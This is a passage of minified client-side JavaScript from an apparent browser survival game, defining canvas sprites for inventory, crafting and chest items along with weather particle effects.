                    sprite[ze.CRAFT_DIVING_MASK] = sprite[ze.INV_DIVING_MASK],
                    sprite[ze.INV_SCALES] = O(1, [{
                        f: S1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#961B1B", "#702727", "#C43B3B"]
                    }], .15, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_SUPER_DIVING_SUIT] = O(1, [{
                        f: bt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#F0D200", "#B09A00", "#79359E", "#652D8E", "#1e2021"]
                    }], .3, ["#35b1b5", "#46c2c9", "#33b4e4"], .5),
                    sprite[ze.CRAFT_SUPER_DIVING_SUIT] = sprite[ze.INV_SUPER_DIVING_SUIT],
                    sprite[ze.INV_PLOT] = O(1, [{
                        f: u0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#352E1E", "#4C3B19", "#574122"]
                    }], .3, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_PLOT] = sprite[ze.INV_PLOT],
                    sprite[ze.INV_GARLAND] = O(1, [{
                        f: r1,
                        x: -5,
                        y: -5,
                        a: 1,
                        r: 0,
                        c: ["#e2d63b", "#ee71a9", "#42b672"]
                    }], 1, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CHEST_GARLAND] = sprite[ze.INV_GARLAND],
                    sprite[ze.INV_BRIDGE] = O(1, [{
                        f: a0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#332715", "#4C3B19", "#574122"]
                    }], .5, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_BRIDGE] = sprite[ze.INV_BRIDGE],
                    sprite[ze.INV_ROOF] = O(1, [{
                        f: a1,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#352618", "#402b18", "#4c3b19", "#574122", "#52391e"]
                    }], .3, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_ROOF] = sprite[ze.INV_ROOF],
                    sprite[ze.INV_WATERING_CAN_FULL] = O(1, [{
                        f: d0,
                        x: -1,
                        y: 0,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#1e2021", "#674C2A", "#4C3B19", "#594225", "#1678a2"]
                    }], .4, ["#35b1b5", "#46c2c9", "#33b4e4"], .7),
                    sprite[ze.CRAFT_WATERING_CAN_FULL] = sprite[ze.INV_WATERING_CAN_FULL],
                    sprite[ze.INV_WATERING_CAN] = O(1, [{
                        f: d0,
                        x: -1,
                        y: 0,
                        a: 1,
                        r: -Math.PI / 5,
                        c: ["#1e2021", "#674C2A", "#4C3B19", "#594225", "#3F2D18", "#2D2112"]
                    }], .4, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.CRAFT_WATERING_CAN] = sprite[ze.INV_WATERING_CAN],
                    sprite[ze.INV_FLOUR] = O(1, [{
                        f: R0,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#B3AA8E", "#817961", "#EBEAE2", "#E0DFD8"]
                    }], .25, ["#2b5c48", "#2b5c48", "#2b5c48"], .5),
                    sprite[ze.INV_CRAB_STICK] = O(1, [{
                        f: nt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#ed5f4f", "#ce4545", "#ffffff", "#e2dad7"]
                    }], .2, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CHEST_CRAB_STICK] = sprite[ze.INV_CRAB_STICK],
                    sprite[ze.INV_CAKE] = O(1, [{
                        f: Nt,
                        x: 0,
                        y: 0,
                        a: 1,
                        r: 0,
                        c: ["#1e2021", "#63391a", "#523124", "#d2c4b9", "#c1aca2", "#d8cbc2", "#c8b5ac", "#ac222a", "#e6636a"]
                    }], .25, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_CAKE] = sprite[ze.INV_CAKE],
                    sprite[ze.INV_SANDWICH] = O(1, [{
                        f: N1,
                        x: -2,
                        y: -8,
                        a: 1,
                        r: 0,
                        c: ["#dfd6bc", "#7b5139", "#bf8d50", "#834e49", "#602820", "#d7ccaa"]
                    }], .25, ["#3ba578", "#4eb687", "#3da34d"], .5),
                    sprite[ze.CRAFT_SANDWICH] = sprite[ze.INV_SANDWICH],
                    sprite[ze.INV_LAVA_SWORD] = [],
                    sprite[ze.INV_LAVA_SWORD][0] = IMAGES.INV_LAVA_SWORD_OUT,
                    sprite[ze.INV_LAVA_SWORD][1] = IMAGES.INV_LAVA_SWORD_IN,
                    sprite[ze.INV_LAVA_SWORD][2] = IMAGES.INV_LAVA_SWORD_CLICK,
                    sprite[ze.CRAFT_LAVA_SWORD] = sprite[ze.INV_LAVA_SWORD],
                    sprite[ze.CHEST_LAVA_SWORD] = sprite[ze.INV_LAVA_SWORD],
                    sprite[ze.INV_LAVA_SPEAR] = [],
                    sprite[ze.INV_LAVA_SPEAR][0] = IMAGES.INV_LAVA_SPEAR_OUT,
                    sprite[ze.INV_LAVA_SPEAR][1] = IMAGES.INV_LAVA_SPEAR_IN,
                    sprite[ze.INV_LAVA_SPEAR][2] = IMAGES.INV_LAVA_SPEAR_CLICK,
                    sprite[ze.CRAFT_LAVA_SPEAR] = sprite[ze.INV_LAVA_SPEAR],
                    sprite[ze.CHEST_LAVA_SPEAR] = sprite[ze.INV_LAVA_SPEAR],
                    sprite[ze.CRAFT_REIDITE_SWORD] = sprite[ze.INV_REIDITE_SWORD],
                    sprite[ze.CHEST_REIDITE_SWORD] = sprite[ze.INV_REIDITE_SWORD],
                    sprite[ze.INV_REIDITE_SWORD] = [],
                    sprite[ze.INV_REIDITE_SWORD][0] = IMAGES.INV_REIDITE_SWORD_OUT,
                    sprite[ze.INV_REIDITE_SWORD][1] = IMAGES.INV_REIDITE_SWORD_IN,
                    sprite[ze.INV_REIDITE_SWORD][2] = IMAGES.INV_REIDITE_SWORD_CLICK,
                    sprite[ze.CRAFT_REIDITE_SWORD] = sprite[ze.INV_REIDITE_SWORD],
                    sprite[ze.CHEST_REIDITE_SWORD] = sprite[ze.INV_REIDITE_SWORD],
                    sprite[ze.INV_REIDITE_SPEAR] = [],
                    sprite[ze.INV_REIDITE_SPEAR][0] = IMAGES.INV_REIDITE_SPEAR_OUT,
                    sprite[ze.INV_REIDITE_SPEAR][1] = IMAGES.INV_REIDITE_SPEAR_IN,
                    sprite[ze.INV_REIDITE_SPEAR][2] = IMAGES.INV_REIDITE_SPEAR_CLICK,
                    sprite[ze.CRAFT_REIDITE_SPEAR] = sprite[ze.INV_REIDITE_SPEAR],
                    sprite[ze.CHEST_REIDITE_SPEAR] = sprite[ze.INV_REIDITE_SPEAR],
                    sprite[ze.INV_DIAMOND_PROTECTION] = [],
                    sprite[ze.INV_DIAMOND_PROTECTION][0] = IMAGES.INV_DIAMOND_PROTECTION_OUT,
                    sprite[ze.INV_DIAMOND_PROTECTION][1] = IMAGES.INV_DIAMOND_PROTECTION_IN,
                    sprite[ze.INV_DIAMOND_PROTECTION][2] = IMAGES.INV_DIAMOND_PROTECTION_CLICK,
                    sprite[ze.CRAFT_DIAMOND_PROTECTION] = sprite[ze.INV_DIAMOND_PROTECTION],
                    sprite[ze.CHEST_DIAMOND_PROTECTION] = sprite[ze.INV_DIAMOND_PROTECTION],
                    sprite[ze.INV_AMETHYST_PROTECTION] = [],
                    sprite[ze.INV_AMETHYST_PROTECTION][0] = IMAGES.INV_AMETHYST_PROTECTION_OUT,
                    sprite[ze.INV_AMETHYST_PROTECTION][1] = IMAGES.INV_AMETHYST_PROTECTION_IN,
                    sprite[ze.INV_AMETHYST_PROTECTION][2] = IMAGES.INV_AMETHYST_PROTECTION_CLICK,
                    sprite[ze.CRAFT_AMETHYST_PROTECTION] = sprite[ze.INV_AMETHYST_PROTECTION],
                    sprite[ze.CHEST_AMETHYST_PROTECTION] = sprite[ze.INV_AMETHYST_PROTECTION],
                    sprite[ze.INV_REIDITE_PROTECTION] = [],
                    sprite[ze.INV_REIDITE_PROTECTION][0] = IMAGES.INV_REIDITE_PROTECTION_OUT,
                    sprite[ze.INV_REIDITE_PROTECTION][1] = IMAGES.INV_REIDITE_PROTECTION_IN,
                    sprite[ze.INV_REIDITE_PROTECTION][2] = IMAGES.INV_REIDITE_PROTECTION_CLICK,
                    sprite[ze.CRAFT_REIDITE_PROTECTION] = sprite[ze.INV_REIDITE_PROTECTION],
                    sprite[ze.CHEST_REIDITE_PROTECTION] = sprite[ze.INV_REIDITE_PROTECTION],
                    sprite[ze.INV_REIDITE_HELMET] = [],
                    sprite[ze.INV_REIDITE_HELMET][0] = IMAGES.INV_REIDITE_HELMET_OUT,
                    sprite[ze.INV_REIDITE_HELMET][1] = IMAGES.INV_REIDITE_HELMET_IN,
                    sprite[ze.INV_REIDITE_HELMET][2] = IMAGES.INV_REIDITE_HELMET_CLICK,
                    sprite[ze.CRAFT_REIDITE_HELMET] = sprite[ze.INV_REIDITE_HELMET],
                    sprite[ze.CHEST_REIDITE_HELMET] = sprite[ze.INV_REIDITE_HELMET],
                    sprite[ze.INV_LAVA_HELMET] = [],
                    sprite[ze.INV_LAVA_HELMET][0] = IMAGES.INV_LAVA_HELMET_OUT,
                    sprite[ze.INV_LAVA_HELMET][1] = IMAGES.INV_LAVA_HELMET_IN,
                    sprite[ze.INV_LAVA_HELMET][2] = IMAGES.INV_LAVA_HELMET_CLICK,
                    sprite[ze.CRAFT_LAVA_HELMET] = sprite[ze.INV_LAVA_HELMET],
                    sprite[ze.CHEST_LAVA_HELMET] = sprite[ze.INV_LAVA_HELMET],
                    sprite[ze.INV_FIREFLY] = [],
                    sprite[ze.INV_FIREFLY][0] = IMAGES.INV_FIREFLY_OUT,
                    sprite[ze.INV_FIREFLY][1] = IMAGES.INV_FIREFLY_IN,
                    sprite[ze.INV_FIREFLY][2] = IMAGES.INV_FIREFLY_CLICK,
                    sprite[ze.CRAFT_FIREFLY] = sprite[ze.INV_FIREFLY],
                    sprite[ze.CHEST_FIREFLY] = sprite[ze.INV_FIREFLY],
                    sprite[ze.INV_WITCH] = [],
                    sprite[ze.INV_WITCH][0] = IMAGES.INV_WITCH_OUT,
                    sprite[ze.INV_WITCH][1] = IMAGES.INV_WITCH_IN,
                    sprite[ze.INV_WITCH][2] = IMAGES.INV_WITCH_CLICK,
                    sprite[ze.CRAFT_WITCH] = sprite[ze.INV_WITCH],
                    sprite[ze.CHEST_WITCH] = sprite[ze.INV_WITCH],
                    sprite[ze.INV_NIMBUS] = [],
                    sprite[ze.INV_NIMBUS][0] = IMAGES.INV_NIMBUS_OUT,
                    sprite[ze.INV_NIMBUS][1] = IMAGES.INV_NIMBUS_IN,
                    sprite[ze.INV_NIMBUS][2] = IMAGES.INV_NIMBUS_CLICK,
                    sprite[ze.CRAFT_NIMBUS] = sprite[ze.INV_NIMBUS],
                    sprite[ze.CHEST_NIMBUS] = sprite[ze.INV_NIMBUS],
                    sprite[ze.INV_REIDITE] = [],
                    sprite[ze.INV_REIDITE][0] = IMAGES.INV_REIDITE_OUT,
                    sprite[ze.INV_REIDITE][1] = IMAGES.INV_REIDITE_IN,
                    sprite[ze.INV_REIDITE][2] = IMAGES.INV_REIDITE_CLICK,
                    sprite[ze.CHEST_REIDITE] = sprite[ze.INV_REIDITE],
                    sprite[ze.INV_FLAME] = [],
                    sprite[ze.INV_FLAME][0] = IMAGES.INV_FLAME_OUT,
                    sprite[ze.INV_FLAME][1] = IMAGES.INV_FLAME_IN,
                    sprite[ze.INV_FLAME][2] = IMAGES.INV_FLAME_CLICK,
                    sprite[ze.CHEST_FLAME] = sprite[ze.INV_FLAME],
                    sprite[ze.CHEST_SHOVEL] = sprite[ze.INV_SHOVEL],
                    sprite[ze.CHEST_SHOVEL_GOLD] = sprite[ze.INV_SHOVEL_GOLD],
                    sprite[ze.CHEST_SHOVEL_DIAMOND] = sprite[ze.INV_SHOVEL_DIAMOND],
                    sprite[ze.CHEST_SHOVEL_AMETHYST] = sprite[ze.INV_SHOVEL_AMETHYST],
                    sprite[ze.CHEST_SEED] = sprite[ze.INV_SEED],
                    sprite[ze.CHEST_WHEAT_SEED] = sprite[ze.INV_WHEAT_SEED],
                    sprite[ze.CHEST_WINDMILL] = sprite[ze.INV_WINDMILL],
                    sprite[ze.CHEST_WILD_WHEAT] = sprite[ze.INV_WILD_WHEAT],
                    sprite[ze.CHEST_FIRE] = sprite[ze.INV_FIRE],
                    sprite[ze.CHEST_DRAGON_ORB] = sprite[ze.INV_DRAGON_ORB],
                    sprite[ze.CHEST_DRAGON_CUBE] = sprite[ze.INV_DRAGON_CUBE],
                    sprite[ze.CHEST_LAVA_ORB] = sprite[ze.INV_LAVA_ORB],
                    sprite[ze.CHEST_LAVA_CUBE] = sprite[ze.INV_LAVA_CUBE];
                sprite[ze.CHEST_BIG_FIRE] = sprite[ze.INV_BIG_FIRE],
                    sprite[ze.CHEST_SUGAR_CAN] = sprite[ze.INV_SUGAR_CAN],
                    sprite[ze.CHEST_PIRATE_SWORD] = sprite[ze.INV_PIRATE_SWORD],
                    sprite[ze.CHEST_SWORD_WOOD] = sprite[ze.INV_SWORD_WOOD],
                    sprite[ze.CHEST_SWORD] = sprite[ze.INV_SWORD],
                    sprite[ze.CHEST_CURSED_SWORD] = sprite[ze.INV_CURSED_SWORD],
                    sprite[ze.CHEST_SWORD_GOLD] = sprite[ze.INV_SWORD_GOLD],
                    sprite[ze.CHEST_SWORD_DIAMOND] = sprite[ze.INV_SWORD_DIAMOND],
                    sprite[ze.CHEST_SWORD_AMETHYST] = sprite[ze.INV_SWORD_AMETHYST],
                    sprite[ze.CHEST_PICK_WOOD] = sprite[ze.INV_PICK_WOOD],
                    sprite[ze.CHEST_PICK] = sprite[ze.INV_PICK],
                    sprite[ze.CHEST_PICK_GOLD] = sprite[ze.INV_PICK_GOLD],
                    sprite[ze.CHEST_PICK_DIAMOND] = sprite[ze.INV_PICK_DIAMOND],
                    sprite[ze.CHEST_PICK_AMETHYST] = sprite[ze.INV_PICK_AMETHYST],
                    sprite[ze.CHEST_STONE] = sprite[ze.INV_STONE],
                    sprite[ze.CHEST_GOLD] = sprite[ze.INV_GOLD],
                    sprite[ze.CHEST_DIAMOND] = sprite[ze.INV_DIAMOND],
                    sprite[ze.CHEST_WOOD] = sprite[ze.INV_WOOD],
                    sprite[ze.CHEST_PLANT] = sprite[ze.INV_PLANT],
                    sprite[ze.CHEST_WORKBENCH] = sprite[ze.INV_WORK],
                    sprite[ze.CHEST_STONE_WALL] = sprite[ze.INV_STONE_WALL],
                    sprite[ze.CHEST_DIAMOND_WALL] = sprite[ze.INV_DIAMOND_WALL],
                    sprite[ze.CHEST_GOLD_WALL] = sprite[ze.INV_GOLD_WALL],
                    sprite[ze.CHEST_AMETHYST_WALL] = sprite[ze.INV_AMETHYST_WALL],
                    sprite[ze.CHEST_WALL] = sprite[ze.INV_WALL],
                    sprite[ze.CHEST_SPIKE] = sprite[ze.INV_SPIKE],
                    sprite[ze.CHEST_MEAT] = sprite[ze.INV_MEAT],
                    sprite[ze.CHEST_COOKED_MEAT] = sprite[ze.INV_COOKED_MEAT],
                    sprite[ze.CHEST_CORD] = sprite[ze.INV_CORD],
                    sprite[ze.CHEST_BLUE_CORD] = sprite[ze.INV_BLUE_CORD],
                    sprite[ze.CHEST_BANDAGE] = sprite[ze.INV_BANDAGE],
                    sprite[ze.CHEST_LOCK] = sprite[ze.INV_LOCK],
                    sprite[ze.CHEST_LOCKPICK] = sprite[ze.INV_LOCKPICK],
                    sprite[ze.CHEST_RESURRECTION] = sprite[ze.INV_RESURRECTION],
                    sprite[ze.CHEST_DRAGON_HEART] = sprite[ze.INV_DRAGON_HEART],
                    sprite[ze.CHEST_LAVA_HEART] = sprite[ze.INV_LAVA_HEART],
                    sprite[ze.CHEST_DRAGON_SWORD] = sprite[ze.INV_DRAGON_SWORD],
                    sprite[ze.CHEST_TOTEM] = sprite[ze.INV_TOTEM],
                    sprite[ze.CHEST_DOOR_WOOD_CLOSE] = sprite[ze.INV_DOOR_WOOD_CLOSE],
                    sprite[ze.CHEST_CHEST] = sprite[ze.INV_CHEST],
                    sprite[ze.CHEST_SLOT] = c(function (e, t) {
                        var i = document.createElement("canvas")
                            , n = i.getContext("2d");
                        return i.width = 118 * e,
                            i.height = 129 * e,
                            n.save(),
                            n.translate(90 * e, 90 * e),
                            Ve(n, -86.5 * e, -86 * e, 110 * e, 110 * e, 15 * e),
                            n.restore(),
                            he(n, t[0], t[1], 4),
                            n.save(),
                            Ve(n, 30 * e, 115 * e, 60 * e, 5 * e, 15 * e),
                            n.restore(),
                            he(n, t[2], t[3], 4),
                            n.save(),
                            Ve(n, 50 * e, 117 * e, 20 * e, 10 * e, 15 * e),
                            n.restore(),
                            he(n, t[2]),
                            i
                    }(.8, ["#4c3b19", "#c4a23a", "#c4a23a", "#c4a23a"])),
                    sprite[ze.CHEST_PLUS] = O(.5, [{
                        f: Zt,
                        x: 0,
                        y: 2,
                        a: 1,
                        r: 0,
                        c: ["#ffffff"]
                    }], .16, ["#c4a23a", "#d0ad41", "#b89733"], .9),
                    sprite[ze.CHEST_STONE_SPIKE] = sprite[ze.INV_STONE_SPIKE],
                    sprite[ze.CHEST_GOLD_SPIKE] = sprite[ze.INV_GOLD_SPIKE],
                    sprite[ze.CHEST_DIAMOND_SPIKE] = sprite[ze.INV_DIAMOND_SPIKE],
                    sprite[ze.CHEST_AMETHYST_SPIKE] = sprite[ze.INV_AMETHYST_SPIKE],
                    sprite[ze.CHEST_BAG] = sprite[ze.INV_BAG],
                    sprite[ze.CHEST_SPECIAL_FUR] = sprite[ze.INV_SPECIAL_FUR],
                    sprite[ze.CHEST_SPECIAL_FUR_2] = sprite[ze.INV_SPECIAL_FUR_2],
                    sprite[ze.CHEST_FUR] = sprite[ze.INV_FUR],
                    sprite[ze.CHEST_KRAKEN_SKIN] = sprite[ze.INV_KRAKEN_SKIN],
                    sprite[ze.CHEST_FUR_WOLF] = sprite[ze.INV_FUR_WOLF],
                    sprite[ze.CHEST_FUR_BOAR] = sprite[ze.INV_FUR_BOAR],
                    sprite[ze.CHEST_FUR_WINTER] = sprite[ze.INV_FUR_WINTER],
                    sprite[ze.CHEST_EARMUFFS] = sprite[ze.INV_EARMUFFS],
                    sprite[ze.CHEST_CAP_SCARF] = sprite[ze.INV_CAP_SCARF],
                    sprite[ze.CHEST_DOOR_STONE_CLOSE] = sprite[ze.INV_DOOR_STONE_CLOSE],
                    sprite[ze.CHEST_DOOR_GOLD_CLOSE] = sprite[ze.INV_DOOR_GOLD_CLOSE],
                    sprite[ze.CHEST_DOOR_DIAMOND_CLOSE] = sprite[ze.INV_DOOR_DIAMOND_CLOSE],
                    sprite[ze.CHEST_DOOR_AMETHYST_CLOSE] = sprite[ze.INV_DOOR_AMETHYST_CLOSE],
                    sprite[ze.CHEST_COAT] = sprite[ze.INV_COAT],
                    sprite[ze.CHEST_WOOD_SPEAR] = sprite[ze.INV_WOOD_SPEAR],
                    sprite[ze.CHEST_SPEAR] = sprite[ze.INV_SPEAR],
                    sprite[ze.CHEST_GOLD_SPEAR] = sprite[ze.INV_GOLD_SPEAR],
                    sprite[ze.CHEST_DIAMOND_SPEAR] = sprite[ze.INV_DIAMOND_SPEAR],
                    sprite[ze.CHEST_AMETHYST_SPEAR] = sprite[ze.INV_AMETHYST_SPEAR],
                    sprite[ze.CHEST_DRAGON_SPEAR] = sprite[ze.INV_DRAGON_SPEAR],
                    sprite[ze.CHEST_SUPER_HAMMER] = sprite[ze.INV_SUPER_HAMMER],
                    sprite[ze.CHEST_SPANNER] = sprite[ze.INV_SPANNER],
                    sprite[ze.CHEST_HAMMER] = sprite[ze.INV_HAMMER],
                    sprite[ze.CHEST_HAMMER_GOLD] = sprite[ze.INV_HAMMER_GOLD],
                    sprite[ze.CHEST_HAMMER_DIAMOND] = sprite[ze.INV_HAMMER_DIAMOND],
                    sprite[ze.CHEST_HAMMER_AMETHYST] = sprite[ze.INV_HAMMER_AMETHYST],
                    sprite[ze.CHEST_FURNACE] = sprite[ze.INV_FURNACE],
                    sprite[ze.CHEST_BREAD_OVEN] = sprite[ze.INV_BREAD_OVEN],
                    sprite[ze.CHEST_EXPLORER_HAT] = sprite[ze.INV_EXPLORER_HAT],
                    sprite[ze.CHEST_STONE_HELMET] = sprite[ze.INV_STONE_HELMET],
                    sprite[ze.CHEST_GOLD_HELMET] = sprite[ze.INV_GOLD_HELMET],
                    sprite[ze.CHEST_DIAMOND_HELMET] = sprite[ze.INV_DIAMOND_HELMET],
                    sprite[ze.CHEST_AMETHYST_HELMET] = sprite[ze.INV_AMETHYST_HELMET],
                    sprite[ze.CHEST_DRAGON_HELMET] = sprite[ze.INV_DRAGON_HELMET],
                    sprite[ze.CHEST_BOOK] = sprite[ze.INV_BOOK],
                    sprite[ze.CHEST_PAPER] = sprite[ze.INV_PAPER],
                    sprite[ze.CHEST_AMETHYST] = sprite[ze.INV_AMETHYST],
                    sprite[ze.CHEST_BRIDGE] = sprite[ze.INV_BRIDGE],
                    sprite[ze.CHEST_ROOF] = sprite[ze.INV_ROOF],
                    sprite[ze.CHEST_PLOT] = sprite[ze.INV_PLOT],
                    sprite[ze.CHEST_SAND] = sprite[ze.INV_SAND],
                    sprite[ze.CHEST_BREAD] = sprite[ze.INV_BREAD],
                    sprite[ze.CHEST_ICE] = sprite[ze.INV_ICE],
                    sprite[ze.CHEST_GROUND] = sprite[ze.INV_GROUND],
                    sprite[ze.CHEST_BOTTLE_FULL] = sprite[ze.INV_BOTTLE_FULL],
                    sprite[ze.CHEST_BOTTLE_EMPTY] = sprite[ze.INV_BOTTLE_EMPTY],
                    sprite[ze.CHEST_WATERING_CAN] = sprite[ze.INV_WATERING_CAN],
                    sprite[ze.CHEST_FLOUR] = sprite[ze.INV_FLOUR],
                    sprite[ze.CHEST_COOKIE] = sprite[ze.INV_COOKIE],
                    sprite[ze.CHEST_CANDY] = sprite[ze.INV_CANDY],
                    sprite[ze.CHEST_FERRERO] = sprite[ze.INV_FERRERO],
                    sprite[ze.CHEST_SUPER_DIVING_SUIT] = sprite[ze.INV_SUPER_DIVING_SUIT],
                    sprite[ze.CHEST_DIVING_MASK] = sprite[ze.INV_DIVING_MASK],
                    sprite[ze.CHEST_WATERING_CAN_FULL] = sprite[ze.INV_WATERING_CAN_FULL],
                    sprite[ze.CHEST_CAKE] = sprite[ze.INV_CAKE],
                    sprite[ze.CHEST_CRAB_STICK] = sprite[ze.INV_CRAB_STICK],
                    sprite[ze.CHEST_FOODFISH] = sprite[ze.INV_FOODFISH],
                    sprite[ze.CHEST_FOODFISH_COOKED] = sprite[ze.INV_FOODFISH_COOKED],
                    sprite[ze.CHEST_SCALES] = sprite[ze.INV_SCALES],
                    sprite[ze.CHEST_SANDWICH] = sprite[ze.INV_SANDWICH],
                    sprite[ze.CHEST_CROWN_GREEN] = sprite[ze.INV_CROWN_GREEN],
                    sprite[ze.CHEST_GEMME_GREEN] = sprite[ze.INV_GEMME_GREEN],
                    sprite[ze.CHEST_CROWN_ORANGE] = sprite[ze.INV_CROWN_ORANGE],
                    sprite[ze.CHEST_GEMME_ORANGE] = sprite[ze.INV_GEMME_ORANGE],
                    sprite[ze.CHEST_CROWN_BLUE] = sprite[ze.INV_CROWN_BLUE],
                    sprite[ze.CHEST_GEMME_BLUE] = sprite[ze.INV_GEMME_BLUE],
                    sprite[ze.CHEST_HOOD] = sprite[ze.INV_HOOD],
                    sprite[ze.CHEST_PEASANT] = sprite[ze.INV_PEASANT],
                    sprite[ze.CHEST_WINTER_PEASANT] = sprite[ze.INV_WINTER_PEASANT],
                    sprite[ze.CHEST_WINTER_HOOD] = sprite[ze.INV_WINTER_HOOD],
                    sprite[ze.CHEST_BUCKET_EMPTY] = sprite[ze.INV_BUCKET_EMPTY],
                    sprite[ze.CHEST_BUCKET_FULL] = sprite[ze.INV_BUCKET_FULL],
                    sprite[ze.CHEST_WELL] = sprite[ze.INV_WELL],
                    sprite[ze.CHEST_SIGN] = sprite[ze.INV_SIGN],
                    sprite[ze.CHEST_PUMPKIN_SEED] = sprite[ze.INV_PUMPKIN_SEED],
                    sprite[ze.CHEST_GARLIC_SEED] = sprite[ze.INV_GARLIC_SEED],
                    sprite[ze.CHEST_THORNBUSH_SEED] = sprite[ze.INV_THORNBUSH_SEED],
                    sprite[ze.CHEST_WOOD_HELMET] = sprite[ze.INV_WOOD_HELMET],
                    sprite[ze.BUBBLES] = [],
                    sprite[ze.BUBBLES][ze.DAY] = [],
                    sprite[ze.BUBBLES][ze.NIGHT] = [];
                for (var t = 0; t < ze.BUBBLES_SIZES; t++)
                    sprite[ze.BUBBLES][ze.DAY].push(c(Rt(1, 4 + t, "#59B8CE"))),
                        sprite[ze.BUBBLES][ze.NIGHT].push(c(Rt(1, 4 + t, "#90DDD9")));
                for (sprite[ze.FLAKES] = [],
                    sprite[ze.FLAKES][ze.DAY] = [],
                    sprite[ze.FLAKES][ze.NIGHT] = [],
                    t = 0; t < ze.FLAKES_SIZES; t++)
                    sprite[ze.FLAKES][ze.DAY].push(c(Rt(1, 4 + t, "#fff"))),
                        sprite[ze.FLAKES][ze.NIGHT].push(c(Rt(1, 4 + t, "#fff")));
                for (sprite[ze.DESERT] = [],
                    sprite[ze.DESERT][ze.DAY] = [],
                    sprite[ze.DESERT][ze.NIGHT] = [],
                    t = 0; t < ze.FLAKES_SIZES; t++)
                    sprite[ze.DESERT][ze.DAY].push(c(Rt(1, 6 + t, "#DDCD8A"))),
                        sprite[ze.DESERT][ze.NIGHT].push(c(Rt(1, 6 + t, "#155E57")));
                for (sprite[ze.ASHES] = [],
                    sprite[ze.ASHES][ze.DAY] = [],
                    sprite[ze.ASHES][ze.NIGHT] = [],
                    t = 0; t < ze.ASHES_SIZES; t++)
                    sprite[ze.ASHES][ze.DAY].push(c(Rt(1, 4 + t, "#353326"))),
                        sprite[ze.ASHES][ze.NIGHT].push(c(Rt(1, 4 + t, "#1D2526")));
                sprite[ze.GARLAND] = [],
                    sprite[ze.GARLAND][ze.DAY] = c(o1(1.5, 0, ["#ee71a9"])),
                    sprite[ze.GARLAND][ze.NIGHT] = c(o1(1.5, 0, ["#ee71a9"])),
                    sprite[ze.GARLANDS] = [sprite[ze.GARLAND]],
                    sprite[ze.GARLANDS][1] = [],
                    sprite[ze.GARLANDS][2] = [],
                    sprite[ze.GARLANDS][3] = [],
                    sprite[ze.GARLANDS][4] = [],
                    sprite[ze.GARLANDS][1][ze.DAY] = c(o1(1.5, 0, ["#e2d63b"])),
                    sprite[ze.GARLANDS][1][ze.NIGHT] = c(o1(1.5, 0, ["#e2d63b"])),
                    sprite[ze.GARLANDS][2][ze.DAY] = c(o1(1.5, 0, ["#309cbd"])),
                    sprite[ze.GARLANDS][2][ze.NIGHT] = c(o1(1.5, 0, ["#309cbd"])),
                    sprite[ze.GARLANDS][3][ze.DAY] = c(o1(1.5, 0, ["#cd232d"])),
                    sprite[ze.GARLANDS][3][ze.NIGHT] = c(o1(1.5, 0, ["#cd232d"])),
                    sprite[ze.GARLANDS][4][ze.DAY] = c(o1(1.5, 0, ["#42b672"])),
                    sprite[ze.GARLANDS][4][ze.NIGHT] = c(o1(1.5, 0, ["#42b672"])),
                    Utils.gup("cti", window.location.href) ? document.getElementById("version").innerHTML += "[CTI]" : c = function (e) {
                        return e.loaded = 1,
                            e
                    }
                    ,
                    sprite[ze.MARKET_BGD] = c(function () {
                        var e = document.createElement("canvas")
                            , t = e.getContext("2d");
                        e.width = 460,
                            e.height = 220,
                            t.fillStyle = "#3a2a0d",
                            t.fillRect(0, 0, e.width, e.height),
                            t.lineWidth = 4,
                            t.beginPath(),
                            t.strokeStyle = "#513810";
                        for (var i = 20; i < 220; i += 20)
                            t.moveTo(0, i),
                                t.lineTo(460, i),
                                t.closePath(),
                                t.stroke();
                        return e
                    }()),
                    sprite[ze.STONES] = [],
                    sprite[ze.STONES][ze.DAY] = [],
                    sprite[ze.STONES][ze.NIGHT] = [],
                    sprite[ze.STONES][ze.DAY].push(c(At(1.1, 0, ["#0a2d18", "#c3d1cb", "#e4efe8"]))),
                    sprite[ze.STONES][ze.DAY].push(c(At(.9, 0, ["#0a2d18", "#c3d1cb", "#e4efe8"]))),
                    sprite[ze.STONES][ze.DAY].push(c(At(.6, 0, ["#0a2d18", "#c3d1cb", "#e4efe8"]))),
                    sprite[ze.STONES][ze.NIGHT].push(c(At(1.1, 0, ["#0a2728", "#3c8e88", "#40a39b"]))),
                    sprite[ze.STONES][ze.NIGHT].push(c(At(.9, 0, ["#0a2728", "#3c8e88", "#40a39b"]))),
                    sprite[ze.STONES][ze.NIGHT].push(c(At(.6, 0, ["#0a2728", "#3c8e88", "#40a39b"]))),
                    sprite[ze.GOLD] = [],
                    sprite[ze.GOLD][ze.DAY] = [],
                    sprite[ze.GOLD][ze.NIGHT] = [],
                    sprite[ze.GOLD][ze.DAY].push(c(lt(1.5, 0, ["#2b280a", "#ddcf8a", "#f4efc6"]))),
                    sprite[ze.GOLD][ze.DAY].push(c(lt(1.3, 0, ["#2b280a", "#ddcf8a", "#f4efc6"]))),
                    sprite[ze.GOLD][ze.DAY].push(c(lt(1.1, 0, ["#2b280a", "#ddcf8a", "#f4efc6"]))),
                    sprite[ze.GOLD][ze.NIGHT].push(c(lt(1.5, 0, ["#030d14", "#1b4444", "#16605a"]))),
                    sprite[ze.GOLD][ze.NIGHT].push(c(lt(1.3, 0, ["#030d14", "#1b4444", "#16605a"]))),
